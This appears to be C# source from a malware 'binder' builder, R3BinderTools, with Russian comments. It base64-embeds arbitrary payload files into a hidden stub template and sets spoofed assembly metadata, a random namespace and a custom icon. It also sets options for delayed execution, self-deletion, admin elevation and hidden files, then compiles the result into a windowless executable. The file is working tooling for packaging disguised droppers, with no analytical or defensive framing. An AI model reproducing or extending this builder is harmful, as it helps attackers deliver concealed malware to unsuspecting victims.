namespace R3BinderTools.Compilation.CodeDOM
{
    using System;
    using System.CodeDom.Compiler;
    using System.Collections.Generic;
    using System.Drawing;
    using System.IO;
    using Helpers;
    using Microsoft.CSharp;
    using Properties;

    public static class SourceEditor
    {
        public static void Inizialize(BuildDom dom, List<string> Payloads)
        {
            string Source = Resources.NewBuild;

            #region Добавление файлов
            string payloadData = string.Empty; 
            foreach (string payload in Payloads)
            {
                // Если файлов больше чем один добавляем разделитель
                if (!string.IsNullOrEmpty(payloadData)) payloadData += ", "; // payloadData != null
                string replaceData = "%payloadData%™%payloadName%";
                payloadData += replaceData.
                Replace("%payloadName%", $@"{payload.Substring(payload.LastIndexOf(@"\") + 1)}""").
                Replace("%payloadData%", $"\"{Convert.ToBase64String(File.ReadAllBytes(payload))}"); // Шифруем данные в Base64
            }
            #endregion
            #region Замена исходного кода
            Source = Source.Replace("[TITLE]", dom.AssTitle).
                            Replace("[DESCRIPTION]", dom.AssDescription).
                            Replace("[COMPANY]", dom.AssCompany).
                            Replace("[PRODUCT]", dom.AssProduct).
                            Replace("[COPYRIGHT]", dom.AssCopyright).
                            Replace("[VERSION]", dom.AssVersion).
                            Replace("[FILEVERSION]", dom.AssFileVersion).
                            Replace("[GUID]", dom.GuidBox).
                            Replace("[BIN]", payloadData).
                            Replace("%SpaceName%", GenTools.GenString.GeneratePasswordResetToken());

            Source = dom.RunTime.Checked       ? Source.Replace("[Time]", "true")      : Source.Replace("[Time]", "false");
            Source = dom.SuicideBox.Checked    ? Source.Replace("[Delay]", "true")     : Source.Replace("[Delay]", "false");
            Source = dom.AdminFilesBox.Checked ? Source.Replace("[AdminRun]", "true")  : Source.Replace("[AdminRun]", "false");
            Source = dom.HideResources.Checked ? Source.Replace("[HideFiles]", "true") : Source.Replace("[HideFiles]", "false");
            #endregion

            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
            try
            {
                #region Параметры для компиляции билд файла
                using var provider = new CSharpCodeProvider(providerOptions);
                var parameters = new CompilerParameters
                {
                    CompilerOptions = "/define:RELEASE /target:winexe /optimize+ /platform:anycpu /langversion:Default /noconfig",
                    TreatWarningsAsErrors = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    GenerateExecutable = true,
                    OutputAssembly = Path.Combine(GlobalPath.CurrDir, "OutBuild.exe"),
                    ReferencedAssemblies = { "System.dll", "System.Data.dll", "System.Windows.Forms.dll" }
                };
                #endregion
                #region Добавление иконки для билд файла
                if (!string.IsNullOrEmpty(dom.BoxIconPath) && dom.IconCheckBox.Checked)
                {
                    string finalpath = Path.GetFullPath(dom.BoxIconPath);
                    parameters.CompilerOptions += $" /win32icon:\"{finalpath}\"";
                }
                #endregion
                #region Добавление манифеста для билд файла
                if (dom.AdminBuildBox.Checked)
                {
                    parameters.CompilerOptions += $" /win32manifest:{GlobalPath.ManifestFile}";
                }
                #endregion
                #region Компиляция исходного кода
                CompilerResults ResultLog = provider.CompileAssemblyFromSource(parameters, Source);
                if (!ResultLog.Errors.HasErrors)
                {
                    MusicPlay.Inizialize(Resources.GoodBuild);
                    dom.LMessage.Location = new Point(507, 392); 
                    ControlActive.CheckMessage(dom.LMessage, "Билд создан успешно!", Color.YellowGreen, 5000);
                }
                else
                {
                    MusicPlay.Inizialize(Resources.Error_Build);
                    dom.LMessage.Location = new Point(487, 392); 
                    ControlActive.CheckMessage(dom.LMessage, "Ошибка создания билд файла!", Color.YellowGreen, 5000);

                    foreach (CompilerError compilerError in ResultLog.Errors)
                    {
                        File.WriteAllText("Error_Compiler.txt", $"Error: {compilerError?.ToString()} {Environment.NewLine}Line: {compilerError?.Line}{Environment.NewLine}");
                    }
                }
                #endregion
            }
            catch { }
        }
    }
}